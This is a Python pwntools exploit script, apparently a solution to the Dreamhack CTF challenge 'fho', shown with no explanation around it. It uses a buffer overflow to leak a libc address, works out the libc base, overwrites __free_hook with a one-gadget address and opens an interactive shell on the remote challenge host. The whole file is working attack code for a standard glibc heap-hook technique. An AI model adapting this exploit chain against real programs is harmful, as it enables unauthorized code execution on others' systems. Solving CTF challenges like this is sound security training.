#!/usr/bin/env python3
# Name: fho_og.py

from pwn import *

p = remote("host3.dreamhack.games", 8807)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - libc.libc_start_main_return
free_hook = libc_base + libc.symbols['__free_hook']
og = libc_base+0x4f432
# og = libc_base+0x4f3d5
# og = libc_base+0x10a41c

# [2] Overwrite `free_hook` with `og`, one-gadget address
p.sendline(str(free_hook).encode())
p.sendline(str(og).encode())
p.sendline(str(0x31337).encode()) # 0x31337은 그냥 밈 값임

p.interactive()